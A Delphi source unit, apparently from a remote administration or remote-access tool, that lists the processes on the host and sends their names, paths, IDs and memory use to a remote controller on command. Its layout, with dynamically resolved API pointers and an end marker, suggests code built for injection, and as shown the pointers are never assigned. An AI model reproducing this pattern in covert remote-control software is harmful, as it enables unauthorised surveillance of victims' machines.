unit untProcessmanager;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ComCtrls, untClientObject, Vcl.Menus, untUtils, TlHelp32,
  PsAPI;

type
  TForm4 = class(TForm)
    ListView1: TListView;
    PopupMenu1: TPopupMenu;
    Refresh1: TMenuItem;
  private
    { Private-Deklarationen }
  public
    { Public-Deklarationen }
    mClientThread:TClientThread;
    procedure InitializeForm(pClientThread:TClientThread);
  end;

var
  Form4: TForm4;

procedure Processmanager(pConn:PConnRec; pData:Pointer; dwLen:Cardinal);stdcall;

implementation

{$R *.dfm}
uses
  untCommands;

procedure Processmanager_CALL(pConn:PConnRec; pData:Pointer; dwLen:Cardinal);stdcall;
begin
  Processmanager(pConn, pData, dwLen);
end;

function pGetProcessList(pConn:PConnRec): Boolean;
var
  iFullLen, iSubLen: Integer;
  lpszBuffer: PWideChar;
  szBuffer: Array[0..500] Of WideChar;
  szFilePath:Array[0..MAX_PATH] of WideChar;
  Process32: TProcessEntry32W;
  hProcessSnapshot, hProcessHandle: THandle;
  pcb : PROCESS_MEMORY_COUNTERS;
  xCreateToolhelp32Snapshot:function (dwFlags, th32ProcessID: DWORD):THandle;stdcall;
  xProcess32FirstW:function(hSnapshot: THandle; var lppe: TProcessEntry32W): BOOL;stdcall;
  xProcess32NextW:function(hSnapshot: THandle; var lppe: TProcessEntry32W): BOOL;stdcall;
  xOpenProcess:function(dwDesiredAccess: DWORD; bInheritHandle: BOOL; dwProcessId: DWORD): THandle; stdcall;
  xlstrcpyW:function(lpString1, lpString2: LPCWSTR): LPWSTR; stdcall;
  xGetCurrentProcessId:function:DWORD; stdcall;
  xCloseHandle:function(hObject: THandle): BOOL; stdcall;
  xGetProcessMemoryInfo:function(Process: THandle; ppsmemCounters: PPROCESS_MEMORY_COUNTERS; cb: DWORD): BOOL; stdcall;
  xGetModuleFileNameExW:function (hProcess: THandle; hModule: HMODULE; lpFilename: LPCWSTR; nSize: DWORD): DWORD; stdcall;
begin
  Result := False;
  pConn.xSendBuffer(pConn, CMD_PROCESS_LIST_START, nil, 1, False);
  lpszBuffer := pConn.pAPI.xAllocMem(pConn.pAPI, 4096);
  if (lpszBuffer <> nil) then
  begin
    iFullLen := 0;
    hProcessSnapshot := xCreateToolHelp32SnapShot(TH32CS_SNAPALL, 0);
    Process32.dwSize := SizeOf(TProcessEntry32W);
    xProcess32FirstW(hProcessSnapshot, Process32);
    repeat
      pConn.pAPI.xZeroMemory(szFilePath, MAX_PATH);
      if ((Process32.szExeFile[1] = ':') or (Process32.szExeFile[1] = '?')) then
      begin
        Continue;
      end;
      hProcessHandle := xOpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, False, Process32.th32ProcessID);
      pcb.WorkingSetSize := 0;
      if hProcessHandle <> 0 then
      begin
        if (xGetModuleFileNameExW(hProcessHandle, 0, @szFilePath[0], MAX_PATH)) = 0 then
          xlstrcpyW(szFilePath, 'System');
        xGetProcessMemoryInfo(hProcessHandle,@pcb,sizeof(pcb));
        xCloseHandle(hProcessHandle);
      end;
      if (Process32.th32ProcessID <> xGetCurrentProcessId) or (Process32.th32ProcessID = 0) then
        iSubLen := pConn.pAPI.xwsprintfW(szBuffer, '%s*%s*%d*%d*%d|', Process32.szExeFile, szFilePath, Process32.th32ProcessID, pcb.WorkingSetSize, Process32.cntThreads)
      else
        iSubLen := pConn.pAPI.xwsprintfW(szBuffer, '%s*%s*I%d*%d*%d|', Process32.szExeFile, szFilePath, Process32.th32ProcessID, pcb.WorkingSetSize, Process32.cntThreads);
      pConn.pAPI.xlstrcatW(lpszBuffer, szBuffer);
      iFullLen := iFullLen + iSubLen;
      if (iFullLen >= 1800) then
      begin
        pConn.xSendBuffer(pConn, CMD_PROCESS_LISTWRITE, lpszBuffer, (iFullLen * 2), False);
        iFullLen := 0;
        pConn.pAPI.xZeroMemory(lpszBuffer, 4096);
      end;
    until not (xProcess32NextW(hProcessSnapshot, Process32));
    if (iFullLen <> 0) then
      pConn.xSendBuffer(pConn, CMD_PROCESS_LISTWRITE, lpszBuffer, (iFullLen * 2), False);
    xCloseHandle(hProcessSnapshot);
    pConn.pAPI.xFreeMem(pConn.pAPI, lpszBuffer);
  end;
  pConn.xSendBuffer(pConn, CMD_PROCESS_LIST_END, nil, 1, False);
end;

procedure Processmanager(pConn:PConnRec; pData:Pointer; dwLen:Cardinal);stdcall;
var
  bCMD:Char;
  pPath:PWideChar;
begin
  bCMD := PChar(pData)^;
  case bCMD of
    'A':pGetProcessList(pConn);
  end;
end;
procedure Processmanager_END();begin end;

procedure TForm4.InitializeForm(pClientThread:TClientThread);
begin
  mClientThread := pClientThread;
end;

end.
